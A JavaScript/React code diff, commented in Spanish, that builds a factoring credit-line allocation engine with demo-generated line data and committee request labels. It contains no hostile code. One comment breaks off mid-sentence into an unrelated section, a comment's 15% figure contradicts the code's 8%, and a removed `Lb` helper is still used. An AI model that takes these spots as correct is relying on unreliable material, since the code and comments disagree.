+  // devuelve a su LF2: es preferible a un cliente cuyo uso no cabe en ninguna línea.
+  for (const l3 of lineas.filter((l) => l.tipo === "LF3")) {
+    if (lineas.filter((l) => l.tipo === "LF2").reduce((s, l) => s + l.aprobado, 0) >= necesario) break;
+    const par = lineas.find((l) => l.tipo === "LF2" && l.rutDeudor === l3.rutDeudor);
+    if (!par) continue;
+    par.aprobado = mmRound(par.aprobado + l3.aprobado); l3.descartada = true;
+  }
+  for (let i = lineas.length - 1; i >= 0; i--) if (lineas[i].descartada) lineas.splice(i, 1);
+
+  // Uso: primero las LF3 ya quemadas (que van completas por definición) y el resto sobre las LF2,
+  // proporcional a lo aprobado. Cuadra EXACTO con el uso del cliente menos el de las comodín: la
+  // utilización es una medición del mismo cedido-no-pagado, se corte por par o por cliente.
+  let objetivoUso = necesario;
+  const lf2 = lineas.filter((l) => l.tipo === "LF2");
+  const capLF2 = lf2.reduce((s, l) => s + l.aprobado, 0);
+  for (const l of lineas) {
+    if (l.tipo !== "LF3" || !l.quemada) continue;
+    if (objetivoUso - l.aprobado < 0 || objetivoUso - l.aprobado > capLF2) continue;
+    l.vigente = l.aprobado; objetivoUso = mmRound(objetivoUso - l.aprobado);
+  }
+  const apLF2 = capLF2 || 1; let usado = 0;
+  lf2.forEach((l, i) => {
+    const ultimo = i === lf2.length - 1;
+    let v = ultimo ? mmRound(objetivoUso - usado) : mmRound(Math.min(l.aprobado, objetivoUso * (l.aprobado / apLF2)));
+    v = Math.max(0, Math.min(l.aprobado, v));
+    l.vigente = v; usado = mmRound(usado + v);
+  });
+  let resto = mmRound(objetivoUso - usado);
+  for (const l of lf2) { if (resto <= 0) break; const t = Math.min(mmRound(l.aprobado - l.vigente), resto); l.vigente = mmRound(l.vigente + t); resto = mmRound(resto - t); }
+
+  res = {
+    estado: "B", asignadaCliente: fila.aprobada, usoCliente: fila.uso,
+    lineas: lineas.concat(comodines), cola: deudores.slice(nPar), restoUso: resto,
+  };
+  _cacheCli.set(rutCli, res); return res;
+}
+
+// Líneas del DEUDOR (nivel 3), indexadas por RUT. Su utilización es la suma de lo que TODOS los
+// clientes le tienen cedido y no pagado: es lo que la convierte en un control de concentración y lo
+// que hace verdadera la columna «a quién afecta» del modal de confirmación.
+let _deudorIdx = null;
+function lineasDeudor() {
+  if (_deudorIdx) return _deudorIdx;
+  const uso = new Map(), clientes = new Map(), nombres = new Map();
+  const anotarDeudor = (rut, nombre, monto, rutCli) => {
+    if (!rut) return;
+    uso.set(rut, mmRound((uso.get(rut) || 0) + monto));
+    if (!clientes.has(rut)) clientes.set(rut, new Set());
+    if (monto > 0 && rutCli) clientes.get(rut).add(rutCli);
+    if (nombre && !nombres.has(rut)) nombres.set(rut, nombre);
+  };
+  for (const l of LINEAS_DATA) {
+    const st = lineasDeCliente(l.rut);
+    for (const ln of st.lineas) if (ln.rutDeudor) anotarDeudor(ln.rutDeudor, ln.nombreDeudor, ln.vigente, l.rut);
+    // Lo usado en la línea de otros deudores se atribuye a la COLA de deudores del cliente —los que no
+    // tienen línea propia—, proporcional a su volumen. Sin esta atribución ese uso no se
+    // descontaría de ninguna línea de deudor y el nivel 3 quedaría subestimado justo en la cola.
+    const usComodin = st.lineas.filter((x) => x.granularidad === "comodin").reduce((s, x) => s + x.vigente, 0);
+    const cola = st.cola || [];
+    const volCola = cola.reduce((s, d) => s + d.vol, 0);
+    if (usComodin > 0 && volCola > 0) cola.forEach((d) => anotarDeudor(d.rut, d.nombre, mmRound(usComodin * (d.vol / volCola)), l.rut));
+    else cola.forEach((d) => anotarDeudor(d.rut, d.nombre, 0, l.rut));
+  }
+  // El universo son TODOS los deudores de las facturas, no sólo los que hoy tienen saldo: la línea
+  // del deudor existe aunque nadie le haya cedido todavía, porque es un tope de concentración.
+  for (const [, lista] of paresPorEmisor()) for (const d of lista) anotarDeudor(d.rut, d.nombre, 0, null);
+
+  _deudorIdx = new Map();
+  for (const [rut, u] of uso) {
+    const rnd = pcRng(hashStr("ldeu" + rut));
+    // Los deudores prime toleran más concentración; en los «Otro» es donde el control muerde.
+    // `ceil` y no `round`: al redondear a tramos de 5 la línea podía nacer BAJO su propio uso.
+    const t = tipoDeudor(rut, nombres.get(rut) || "");
+    // Un 15% de los deudores están CONCENTRADOS: su línea propia queda apenas por sobre lo ya
+    // colocado, así que es ella —y no la del par— la que frena la operación. Sin este tramo el nivel
+    // 3 casi nunca mordía y el caso «hay que ampliar la exposición del deudor», que es el único que
+    // afecta a carteras de otros ejecutivos, prácticamente no aparecía en la demo.
+    const concentrado = hashStr("conc" + rut) % 100 < 8;
+    const holgura = concentrado ? 1.03 + rnd() * 0.09
+      : t === "Lista Blanca" ? 1.25 + rnd() * 0.55 : t === "Deudor Autorizado" ? 1.12 + rnd() * 0.38 : 1.02 + rnd() * 0.20;
+    const base = u > 0 ? u * holgura : 40 + Math.floor(rnd() * 24) * 5;
+    _deudorIdx.set(rut, {
+      rutDeudor: rut, nombre: nombres.get(rut) || "", tipo: t,
+      aprobado: Math.max(Math.ceil(base / 5) * 5, Math.ceil(u / 5) * 5), vigente: u,
+      disponible: mmRound(Math.max(Math.ceil(base / 5) * 5, Math.ceil(u / 5) * 5) - u),
+      nClientes: clientes.get(rut) ? clientes.get(rut).size : 0,
+    });
+  }
+  return _deudorIdx;
+}
+// Línea del deudor por RUT, o null si el RUT no está en el universo de facturas.
+function lineaDeDeudor(rutDeudor) { return lineasDeudor().get(rutDeudor) || null; }
+
+// ============================================================
+// MOTOR DE ASIGNACIÓN DE LÍNEAS
+// Función PURA de (selección de facturas, estado de líneas) → (asignaciones, faltantes). No muta el
+// estado memoizado ni persiste nada: trabaja sobre copias y devuelve el resultado.
+// Regla de validación: una factura se puede cursar sólo si cabe en LOS TRES niveles a la vez:
+//     monto ≤ min( disponible_cliente , disponible_par , disponible_deudor )
+// El recálculo es SIEMPRE COMPLETO. No se recalcula sólo el deudor modificado: la línea del cliente
+// se consume acumulativamente recorriendo en orden de nota, la línea de otros deudores es compartida,
+// un deudor de mejor nota reordena la lista y puede cambiar el resultado de todos los que vienen
+// detrás. Dos caminos de cálculo terminarían divergiendo, y el síntoma sería una operación cursada
+// contra cupo inexistente.
+// ============================================================
+
+// Nombre de negocio de cada línea. El desglose mostraba «Cupo del cliente con este deudor» para
+// LF2 y LF3 juntas y el id crudo («LF2-76190780-1») para las usadas: dos vocabularios que no eran el
+// del negocio y que dejaban al ejecutivo sin saber qué línea se le agotó ni cuál hay que pedir.
+// Las cinco lineas del modelo, con el nombre que usa el negocio. Las dos «globales» son los topes
+// que no dependen del par: la del cliente (su cupo asignado) y la del deudor (compartida por todos
+// los clientes que le ceden). LF4 es del CLIENTE, no del deudor: financia a los deudores que no
+// tienen linea propia con el, y por eso se llama Cliente - Otros Deudores.
+const LINEA_LBL = {
+  LF1: "Línea Inicial Cliente",
+  LF2: "Línea Normal Cliente - Deudor",
+  LF3: "Línea Puntual Cliente - Deudor",
+  LF4: "Línea Cliente - Otros Deudores",
+};
+// Motivo del rechazo → qué se le pide al comité y a quién afecta. Un aumento de la línea del deudor
+// NO se resuelve con una puntual del cliente: son resoluciones distintas y afectan carteras que el
+// ejecutivo no ve, así que la pantalla tiene que distinguirlas.
+// Los rótulos son los NOMBRES de la solicitud en el negocio, no una descripción: el ejecutivo pide
+// «una puntual» y el comité resuelve «una puntual». Los dos motivos de nivel cliente-deudor —haya o
+// no línea propia con ese deudor— se resuelven con la MISMA solicitud, así que llevan el mismo
+// nombre; qué los separa lo dice `MOTIVO_TEXTO`.
+const RESOLUCION_COMITE = {
+  par:     { pide: "Solicitar Línea Puntual Cliente - Deudor", alcance: "Sólo este cliente y este deudor" },
+  lf4:     { pide: "Solicitar Línea Puntual Cliente - Deudor", alcance: "Sólo este cliente y este deudor" },
+  lf1:     { pide: "Asignación de líneas por comité",      alcance: "Todo el cliente" },
+  cliente: { pide: "Ampliar Línea Global Cliente",          alcance: "Todo el cliente" },
+  deudor:  { pide: "Ampliar Línea Global Deudor",           alcance: "Todos los clientes que ceden este deudor" },
+};
+// El motivo se explica en lenguaje de negocio, nunca con el nombre técnico del nivel.
+const MOTIVO_TEXTO = {
+  par:     "sin cupo en la Línea Cliente - Deudor",
+  lf4:     "sin Línea Cliente - Deudor y la Línea Cliente - Otros Deudores está tomada",
+  lf1:     "la línea inicial no cubre este deudor",
+  cliente: "sin cupo en la Línea Global Cliente",
+  deudor:  "la Línea Global Deudor no tiene cupo · la comparten todos sus clientes",
+};
+
+// Línea del deudor con respaldo determinístico: una factura puede venir sin RUT del receptor, y en
+// ese caso el nivel 3 no puede quedar sin tope (equivaldría a exposición infinita en ese deudor).
+function lineaDeudorDe(rut, nombre) {
+  const l = rut ? lineaDeDeudor(rut) : null;
+  if (l) return l;
+  const rnd = pcRng(hashStr("ldeu-fb" + (rut || nombre || "")));
+  const aprobado = 40 + Math.floor(rnd() * 24) * 5;
+  const vigente = Math.round(aprobado * (0.2 + rnd() * 0.55));
+  return { rutDeudor: rut || "", nombre: nombre || "", tipo: tipoDeudor(rut, nombre), aprobado, vigente, disponible: mmRound(aprobado - vigente), nClientes: 1, sintetica: true };
+}
+
+// `inyecta` permite pasar un estado de líneas explícito ({ estado, deudores }) en vez de leerlo de
+// los datos. Es la costura que hace verificable el motor: los escenarios de prueba necesitan una LF3
+// de $120M o una línea de otros deudores agotada, y buscarlos en la cartera real haría depender la
+// ── ANÁLISIS DE DEUDORES DE UNA OFERTA ──────────────────────────────────────────────────────────
+// Es lo que produce la corrida horaria EN LUGAR de simular el negocio: qué deudores entran y cuánto
+// aporta cada tramo de prioridad. El orden de los tramos es el mismo con que `asignarLineas` reparte
+// la línea —Prime primero, después Nota Deudor sobre 4,2, al final el resto— para que el tubo y el
+// motor no puedan contar historias distintas sobre la misma oferta.
+function tramosDeudores(ds) {
+  if (!ds || !ds.length) return null;
+  const sum = (a) => +a.reduce((s2, x) => s2 + (x.monto || 0), 0).toFixed(1);
+  const prime = ds.filter((x) => x.prime);
+  const notaAlta = ds.filter((x) => !x.prime && x.nota > NOTA_PRIORITARIA);
+  const resto = ds.filter((x) => !x.prime && x.nota <= NOTA_PRIORITARIA);
+  return {
+    nDeudores: ds.length, nFacturas: ds.reduce((s2, x) => s2 + (x.n || 0), 0), montoMM: sum(ds),
+    prime: { n: prime.length, montoMM: sum(prime) },
+    notaAlta: { n: notaAlta.length, montoMM: sum(notaAlta) },
+    resto: { n: resto.length, montoMM: sum(resto) },
+  };
+}
+// Desde las facturas itemizadas (DTESync): una entrada por deudor real, con su monto exacto.
+function analisisDeudores(facturas) {
+  const g = new Map();
+  (facturas || []).forEach((f) => {
+    if (!f) return;
+    const tipo = tipoDeudorDisp(f), nombre = f.deudor || "";
+    const k = f.rutRecep || nombre;
+    let x = g.get(k);
+    if (!x) { x = { nombre, prime: tipo === "Lista Blanca" || tipo === "Deudor Autorizado", nota: notaFromScore(scoreDeudor(nombre, tipo).score), n: 0, monto: 0 }; g.set(k, x); }
+    x.n += 1; x.monto += (f.montoMM || 0);
+  });
+  return tramosDeudores([...g.values()]);
+}
+// Desde el deal: usa las facturas si están itemizadas y, si no, el desglose por deudor que trae toda
+// oportunidad. Las de prospección temprana no tienen facturas todavía, pero sí sus deudores.
+function analisisDeudoresDeDeal(deal) {
+  if (!deal) return null;
+  // La OPORTUNIDAD es todo lo que el cliente tiene disponible —lo que ya está en la oferta más lo que
+  // el motor encontró y aún no se selecciona—, no sólo la oferta: la oferta es lo que el ejecutivo
+  // elige y vive en «Simulación». Por eso una factura que llega actualiza esta columna sola, sin
+  // quedar «sin incorporar». Se deduplica por id porque un documento puede estar en ambas listas.
+  if (!deal.agrupado && ((deal.facturasOp && deal.facturasOp.length) || (deal.facturasDisponibles && deal.facturasDisponibles.length))) {
+    const vistas = new Set(); const todas = [];
+    [...(deal.facturasOp || []), ...(deal.facturasDisponibles || [])].forEach((f) => {
+      const k = f && (f.id != null ? f.id : f.folio);
+      if (k == null || vistas.has(k)) return;
+      vistas.add(k); todas.push(f);
+    });
+    return analisisDeudores(todas);
+  }
+  return tramosDeudores((deal.deudores || []).filter((x) => x && x.name).map((x) => {
+    const tipo = tipoDeudor(null, x.name);
+    return { nombre: x.name, prime: tipo === "Lista Blanca" || tipo === "Deudor Autorizado",
+      nota: notaFromScore(scoreDeudor(x.name, tipo).score), n: x.facturas || 0, monto: x.montoMM || 0 };
+  }));
+}
+
+function asignarLineas(facturas, rutCliente, inyecta) {
+  const sel = (facturas || []).filter((f) => f && (f.montoMM || 0) > 0);
+  const st = (inyecta && inyecta.estado) || lineasDeCliente(rutCliente);
+  // Copias de trabajo: la asignación NUNCA muta el estado memoizado del cliente ni el índice de
+  // deudores, porque se re-ejecuta en cada evaluación y tiene que partir siempre del mismo estado.
+  const lineas = st.lineas.map((l) => ({ ...l, usado: 0 }));
+  const deudorWork = new Map();
+  const dispLinea = (l) => mmRound(l.aprobado - l.vigente - l.usado);
+
+  let dispCliente = mmRound(st.asignadaCliente - st.usoCliente);
+  const dispClienteInicial = dispCliente;
+
+  if (!sel.length) {
+    return { vacia: true, cursable: 0, requiereComite: 0, oferta: 0, estadoCliente: st.estado, dispCliente, deudores: [], facturas: [], solicitudes: [], lineasUsadas: [] };
+  }
+
+  // Agrupar por deudor y ordenar por NOTA DESC; desempate por monto seleccionado DESC. El orden
+  // importa porque hay recursos compartidos: la línea de otros deudores y el tope del cliente.
+  const grupos = new Map();
+  for (const f of sel) {
+    const tipo = tipoDeudorDisp(f);
+    const nombre = f.deudor || "";
+    const k = f.rutRecep || nombre;
+    let g = grupos.get(k);
+    if (!g) {
+      g = { key: k, rut: f.rutRecep || "", nombre, tipo, prime: tipo === "Lista Blanca" || tipo === "Deudor Autorizado", nota: notaFromScore(scoreDeudor(nombre, tipo).score), facturas: [], monto: 0 };
+      grupos.set(k, g);
+    }
+    g.facturas.push(f); g.monto += (f.montoMM || 0);
+  }
+  // Manda el TRAMO de prioridad y recién después la nota. Antes ordenaba sólo por nota, y eso
+  // dejaba a un Autorizado de nota 3,5 detrás de un deudor sin clasificar de nota 4,3: al repartir
+  // un recurso escaso la clasificación pesa más que la nota, porque es la que decide si la factura
+  // se cursa sin pasar por comité. Dentro del tramo sigue mandando la nota y el monto desempata.
+  const tramo = (g) => (g.prime || g.nota > NOTA_PRIORITARIA) ? 0 : 1;
+  const orden = [...grupos.values()].sort((a, b) => (tramo(a) - tramo(b)) || (b.nota - a.nota) || (b.monto - a.monto) || a.nombre.localeCompare(b.nombre));
+
+  const resFacturas = [], resDeudores = [];
+  let cursable = 0, requiereComite = 0;
+
+  for (const g of orden) {
+    // Cascada por deudor.
+    let cascada = [], sinCascada = null;
+    if (st.estado === "A") {
+      // Estado A: sólo LF1, y sólo para deudores prime. La LF1 existe para desbloquear la venta a
+      // clientes nuevos; todo lo demás necesita que el comité asigne líneas.
+      const lf1 = lineas.find((l) => l.tipo === "LF1");
+      if (g.prime && lf1) cascada = [lf1]; else sinCascada = "lf1";
+    } else {
+      const pares = lineas.filter((l) => l.granularidad === "par" && l.rutDeudor === g.rut);
+      // La puntual primero: se aprobó para este negocio y es de un solo uso. La normal complementa.
+      const lf3 = pares.filter((l) => l.tipo === "LF3"), lf2 = pares.filter((l) => l.tipo === "LF2");
+      if (lf3.length || lf2.length) cascada = lf3.concat(lf2);
+      else {
+        // La línea de otros deudores NUNCA actúa como colchón de un deudor que ya tiene línea propia: es
+        // exclusivamente el camino de los RUT sin LF2 ni LF3.
+        const comodin = lineas.find((l) => l.granularidad === "comodin" && l.categoria === tipoLineaDeDeudor(g.tipo));
+        if (comodin && !comodin.suspendida) cascada = [comodin]; else sinCascada = "lf4";
+      }
+    }
+
+    const ld = deudorWork.get(g.key) || (() => { const b = (inyecta && inyecta.deudores && inyecta.deudores[g.key]) || lineaDeudorDe(g.rut, g.nombre); const w = { ...b, usado: 0 }; deudorWork.set(g.key, w); return w; })();
+    const capParIni = mmRound(cascada.reduce((s, l) => s + dispLinea(l), 0));
+    const capDeudorIni = mmRound(ld.aprobado - ld.vigente - ld.usado);
+
+    // Dentro de cada deudor, de MAYOR a MENOR monto: maximiza el monto colocado y evita que
+    // facturas chicas consuman el cupo que necesitaba una grande.
+    const facs = g.facturas.slice().sort((a, b) => (b.montoMM || 0) - (a.montoMM || 0));
+    let asignadoDeudor = 0, nConLinea = 0;
+    // Lo que toma ESTE deudor de cada línea. `l.usado` acumula el consumo de TODOS los deudores que
+    // comparten la línea —la de Otros Deudores es de varios—, así que no sirve para responder
+    // cuánto se le asignó a este.
+    const usoPropio = new Map();
+
+    for (const f of facs) {
+      const m = f.montoMM || 0; // crudo: se redondea al publicar, no al acumular
+      const restPar = mmRound(cascada.reduce((s, l) => s + dispLinea(l), 0));
+      const restDeudor = mmRound(ld.aprobado - ld.vigente - ld.usado);
+
+      if (cascada.length && m <= restPar && m <= dispCliente && m <= restDeudor) {
+        // Reparto secuencial entre las líneas de la cascada: una misma factura SÍ puede repartirse
+        // entre dos líneas — consume la primera hasta agotarla y sigue con la siguiente.
+        let resto = m; const origen = [];
+        for (const l of cascada) {
+          if (resto <= 0) break;
+          const toma = Math.min(resto, dispLinea(l));
+          if (toma <= 0) continue;
+          l.usado = mmRound(l.usado + toma);
+          origen.push({ lineaId: l.id, tipo: l.tipo, monto: toma });
+          usoPropio.set(l.id, mmRound((usoPropio.get(l.id) || 0) + toma));
+          resto = mmRound(resto - toma);
+        }
+        dispCliente = mmRound(dispCliente - m);
+        ld.usado = mmRound(ld.usado + m);
+        asignadoDeudor += m; nConLinea++;
+        // Se acumula CRUDO y se redondea una sola vez al final. Redondeando factura por factura, la
+        // suma de cursable + comité se separaba de la oferta y la tarjeta mostraba «Oferta $83,6M ·
+        // Requiere comité $83,7M»: dos cifras que tienen que cuadrar exactamente.
+        cursable += m;
+        resFacturas.push({ id: f.id, folio: f.folio, rutDeudor: g.rut, deudor: g.nombre, monto: mmRound(m), estado: "CON_LINEA", origen });
+      } else {
+        // El motivo es el nivel con MENOR disponible al momento del rechazo: determina qué se pide.
+        let motivo = sinCascada;
+        if (!motivo) {
+          const menor = Math.min(restPar, dispCliente, restDeudor);
+          // Los EMPATES se resuelven hacia el nivel más específico y accionable. Con el criterio
+          // ingenuo («¿es el cliente el menor?») un cliente en estado A —donde la LF1 de $30M y el
+          // disponible del cliente valen lo mismo— reportaba «tope del cliente alcanzado» en vez de
+          // «la línea inicial no cubre este deudor», y mandaba al comité la solicitud equivocada.
+          const nivelPar = st.estado === "A" ? "lf1" : (cascada[0] && cascada[0].granularidad === "comodin" ? "lf4" : "par");
+          motivo = restPar === menor ? nivelPar : restDeudor === menor ? "deudor" : "cliente";
+        }
+        requiereComite += m;
+        // `sinLineaDeudor` distingue las dos resoluciones del nivel deudor: con línea vigente se
+        // AMPLÍA, sin línea hay que SOLICITARLA. No es lo mismo para el comité ni para el ejecutivo.
+        resFacturas.push({ id: f.id, folio: f.folio, rutDeudor: g.rut, deudor: g.nombre, monto: mmRound(m), estado: "REQUIERE_COMITE", origen: [], motivo, motivoTexto: MOTIVO_TEXTO[motivo], sinLineaDeudor: !(ld.aprobado > 0) });
+      }
+    }
+
+    const restPar = mmRound(cascada.reduce((s, l) => s + dispLinea(l), 0));
+    const restDeudor = mmRound(ld.aprobado - ld.vigente - ld.usado);
+    const holgura = Math.max(0, Math.min(restPar, dispCliente, restDeudor));
+    // El nivel del par NO es una línea: puede ser una LF2, una LF3, las dos (una factura se reparte
+    // entre ambas) o la de otros deudores. Sumarlas en una fila sola escondía justo el dato que hace
+    // falta —cuál se agotó y cuál hay que pedir—, así que el desglose las abre una por una.
+    const detallePar = cascada.length
+      ? cascada.map((l) => ({ id: l.id, rut: g.rut, tipo: l.tipo, label: LINEA_LBL[l.tipo] || l.tipo, disponible: mmRound(dispLinea(l)), usado: mmRound(l.usado || 0), usadoDeudor: mmRound(usoPropio.get(l.id) || 0) }))
+      : [{ rut: g.rut, tipo: sinCascada === "lf1" ? "LF1" : "LF2", label: sinCascada === "lf1" ? "Sin Línea Inicial para este deudor" : "Sin Línea Cliente - Deudor", disponible: 0 }];
+    const labelPar = cascada.length === 0 ? "Línea Cliente - Deudor"
+      : cascada.length === 1 ? (LINEA_LBL[cascada[0].tipo] || "Línea Cliente - Deudor")
+      : "Línea Cliente - Deudor (normal + puntual)";
+    // Cuál de los tres topes MANDA: es lo que muestra el detalle bajo el chip de estado.
+    const topes = [
+      // Los tres niveles llevan el nombre con que el negocio los pide al comité —Línea Normal o
+      // Puntual Cliente - Deudor, Línea Cliente y Línea Global Deudor—; antes cada pantalla lo decía
+      // a su manera («cupo del cliente con este deudor», «tope del cliente»). El del par toma el
+      // nombre de la línea que lo sostiene, y `detallePar` lo abre cuando son varias.
+      { nivel: "par", label: labelPar, disponible: restPar },
+      { nivel: "cliente", label: "Línea Global Cliente", disponible: dispCliente },
+      { nivel: "deudor", label: "Línea Global Deudor", sub: "la comparten todos sus clientes", disponible: restDeudor },
+    ];
+    const manda = topes.reduce((a, b) => (b.disponible < a.disponible ? b : a), topes[0]);
+    // Saldo de puntual sin usar: sólo tiene sentido informarlo acotado por la holgura real del
+    // deudor, porque de nada sirve saldo de LF3 si el nivel 3 ya no admite más.
+    const lf3Saldo = mmRound(cascada.filter((l) => l.tipo === "LF3").reduce((s, l) => s + dispLinea(l), 0));
+
+    resDeudores.push({
+      key: g.key, rut: g.rut, nombre: g.nombre, tipo: g.tipo, prime: g.prime, nota: g.nota,
+      seleccionado: mmRound(g.monto), asignado: mmRound(asignadoDeudor),
+      nFacturas: g.facturas.length, nConLinea,
+      estado: nConLinea === 0 ? "sin_linea" : nConLinea === g.facturas.length ? "con_linea" : "parcial",
+      holgura, topes, manda, detallePar, capParIni, capDeudorIni,
+      // Con línea PROPIA (LF2/LF3 del par) o sin ella (la de otros deudores, o ninguna). No es lo
+      // mismo aunque las dos terminen en cupo 0: la primera se AMPLÍA y la segunda hay que CREARLA,
+      // y son dos resoluciones distintas del comité (ver RESOLUCION_COMITE, motivos `par` y `lf4`).
+      conLineaPropia: !!(cascada.length && cascada[0].granularidad === "par"),
+      saldoPuntual: Math.min(lf3Saldo, holgura),
+      lineasUsadas: cascada.filter((l) => l.usado > 0).map((l) => ({ lineaId: l.id, tipo: l.tipo, monto: l.usado })),
+    });
+  }
+
+  // Cierre: toda línea de UN SOLO USO (LF1, LF3) con uso > 0 se marca consumida por completo; el
+  // saldo caduca y no se puede reutilizar. Ese campo alimenta el reporte que le dice al comité si
+  // las puntuales se están dimensionando bien.
+  const lineasUsadas = [];
+  for (const l of lineas) {
+    if (!l.usado) continue;
+    const caduca = (l.tipo === "LF1" || l.tipo === "LF3") ? mmRound(l.aprobado - l.vigente - l.usado) : 0;
+    lineasUsadas.push({ lineaId: l.id, tipo: l.tipo, rutDeudor: l.rutDeudor, usado: l.usado, montoCaducado: caduca });
+  }
+
+  // Solicitudes al comité: UNA por (deudor, motivo), cada una aprobable o recortable por separado.
+  const solMap = new Map();
+  for (const f of resFacturas) {
+    if (f.estado !== "REQUIERE_COMITE") continue;
+    const k = f.rutDeudor + "|" + f.motivo;
+    let s = solMap.get(k);
+    if (!s) {
+      const r = RESOLUCION_COMITE[f.motivo] || RESOLUCION_COMITE.par;
+      const pide = (f.motivo === "deudor" && f.sinLineaDeudor) ? "Solicitar Línea Global Deudor" : r.pide;
+      s = { rutDeudor: f.rutDeudor, deudor: f.deudor, motivo: f.motivo, pide, alcance: r.alcance, monto: 0, nFacturas: 0 };
+      solMap.set(k, s);
+    }
+    s.monto = mmRound(s.monto + f.monto); s.nFacturas++;
+  }
+
+  return {
+    vacia: false, estadoCliente: st.estado,
+    // El total y el cursable se redondean; lo que va a comité se DERIVA de la resta. Redondeando las
+    // dos partes por separado, su suma podía diferir del total en 0,1 y la tarjeta mostraba
+    // «Oferta $68,7M · Cursable $22,4M · Comité $46,4M»: tres cifras que no cuadran a la vista.
+    oferta: mmRound(cursable + requiereComite), cursable: mmRound(cursable),
+    requiereComite: mmRound(mmRound(cursable + requiereComite) - mmRound(cursable)),
+    dispCliente, dispClienteInicial,
+    deudores: resDeudores, facturas: resFacturas,
+    solicitudes: [...solMap.values()].sort((a, b) => b.monto - a.monto),
+    lineasUsadas,
+  };
+}
 function lineaRecomendacion(l) {
   const disponible = l.aprobada - l.uso;
-  if (l.morosidadDias >= 30) return { tipo: "Bloquear línea", color: "#dc2626", bg: "#fef2f2", texto: `Morosidad grave (${l.morosidadDias} días): bloquear la línea y suspender nuevas operaciones hasta regularizar.` };
+  if (l.morosidadDias >= 30) return { tipo: "Bloquear línea", color: "#EF4444", bg: "#fef2f2", texto: `Morosidad grave (${l.morosidadDias} días): bloquear la línea y suspender nuevas operaciones hasta regularizar.` };
   if (l.morosidadDias > 0) return { tipo: "Sujeto a aprobación", color: "#C2410C", bg: "#FFF7ED", texto: `Morosidad de ${l.morosidadDias} días: dejar las nuevas operaciones sujetas a aprobación y evaluar una reducción de la línea.` };
   const faltante = Math.max(0, l.demandaBuenos - disponible);
   if (faltante > 0 && l.sowActual < l.sowTarget) return { tipo: "Aumentar línea", color: "#2563EB", bg: "#eff6ff", texto: `Tiene ${fmtMM(faltante)} en facturas de buenos deudores sin financiar por límite insuficiente; frena el SOW (${l.sowActual}% vs ${l.sowTarget}% target). Se recomienda ampliar la línea.` };
@@ -13916,7 +16686,7 @@ function lineaRecomendacion(l) {
   return { tipo: "Mantener", color: "#16A34A", bg: "#F0FDF4", texto: "Línea adecuada al comportamiento y volumen actual. Mantener." };
 }
 function lineaSalud(l) {
-  if (l.morosidadDias >= 30) return { label: "Crítica", color: "#dc2626" };
+  if (l.morosidadDias >= 30) return { label: "Crítica", color: "#EF4444" };
   if (l.morosidadDias > 0) return { label: "En riesgo", color: "#ea580c" };
   if (l.proyeccion > l.aprobada || (l.demandaBuenos > (l.aprobada - l.uso) && l.sowActual < l.sowTarget)) return { label: "Atención", color: "#ca8a04" };
   if ((l.uso / l.aprobada) < 0.4) return { label: "Subutilizada", color: "#2563eb" };
@@ -14180,7 +16950,6 @@ function PresentacionComite({ linea, clienteInicial, rutInicial, tipoInicial, su
                 const ventasUltMM = api4.indices.ventasSII[2] / 1000, deudaMM = (fin.directa || 0) + (fin.indirecta || 0);
                 const ratio = (a, b) => (b > 0 ? (a / b).toFixed(2) : "---");
                 const achefTot = +(fin.achefVig + fin.achefMor + fin.achefFac + fin.achefChq + fin.achefLet + fin.achefOtr).toFixed(1);
-                const Lb = ({ t, children }) => <label className="t9" style={{ color: C.sub }}>{t}{children}</label>;
                 return (
                 <div className="space-y-3">
                   <div className="rounded-xl p-3" style={{ border: `1px solid ${C.line}` }}>
@@ -14239,7 +17008,7 @@ function PresentacionComite({ linea, clienteInicial, rutInicial, tipoInicial, su
                       <Lb t="Cheques MM$"><input {...fld("achefChq")} /></Lb>
                       <Lb t="Letras MM$"><input {...fld("achefLet")} /></Lb>
                       <Lb t="Otros MM$"><input {...fld("achefOtr")} /></Lb>
-                      <div className="t10 text-right font-bold" style={{ color: fin.achefMor > 0 ? "#DC2626" : C.ink }}>Total: {achefTot} MM</div>
+                      <div className="t10 text-right font-bold" style={{ color: fin.achefMor > 0 ? "#EF4444" : C.ink }}>Total: {achefTot} MM</div>
                     </div>
                   </div>
                 </div>
@@ -14336,7 +17105,7 @@ function PresentacionComite({ linea, clienteInicial, rutInicial, tipoInicial, su
                     <input type="number" className="rounded-md px-2 py-1 t11 text-right" style={inpSty} value={d.propuesta} onChange={(e) => updDeu(i, { propuesta: +e.target.value || 0 })} />
                     <span className="t10 text-right" style={{ color: d.deudaDirecta > 0 ? C.ink : C.faint }}>{d.deudaDirecta > 0 ? "$" + (d.deudaDirecta / 1e6).toFixed(1) + "MM" : "---"}</span>
                     <span className="t10 text-right" style={{ color: d.deudaIndirecta > 0 ? C.ink : C.faint }}>{d.deudaIndirecta > 0 ? "$" + (d.deudaIndirecta / 1e6).toFixed(1) + "MM" : "---"}</span>
-                    <span className="t10 text-right font-semibold" style={{ color: conc > d.politicaPct ? "#DC2626" : C.ink }} title={conc > d.politicaPct ? `Excede la política (${d.politicaPct}% de la línea)` : "Concentración sobre la línea factoring propuesta"}>{conc}%</span>
+                    <span className="t10 text-right font-semibold" style={{ color: conc > d.politicaPct ? "#EF4444" : C.ink }} title={conc > d.politicaPct ? `Excede la política (${d.politicaPct}% de la línea)` : "Concentración sobre la línea factoring propuesta"}>{conc}%</span>
                     <span className="flex gap-1.5">{["V", "N", "C", "FR", "CP"].map((f) => <label key={f} className="flex items-center gap-0.5 t9" style={{ color: C.sub }}><input type="checkbox" checked={!!d.flags[f]} onChange={(e) => updDeu(i, { flags: { ...d.flags, [f]: e.target.checked } })} />{f}</label>)}</span>
                     <span className="flex gap-1">
                       <button onClick={() => setEditDeu(i)} title="Editar deudor factoring" className="rounded p-0.5" style={{ color: C.indigo }}>✎</button>
@@ -14481,7 +17250,7 @@ function PresentacionComite({ linea, clienteInicial, rutInicial, tipoInicial, su
 // Sub-tab EN PROCESO — Bandeja de solicitudes en gestión (API 2 lista · API 3 estado). Solo consulta.
 function LineasBandeja({ onNueva, tick, onRefrescar, cargando }) {
   const sols = api2ListarProcesos();
-  const EST_COL = { "En gestión": { bg: "#eff6ff", fg: "#2563EB" }, "En análisis de Riesgo": { bg: "#FFF7ED", fg: "#C2410C" }, "En comité": { bg: "#f5f3ff", fg: "#7C3AED" }, "Aprobada": { bg: "#F0FDF4", fg: "#16A34A" }, "Observada": { bg: "#fef2f2", fg: "#DC2626" } };
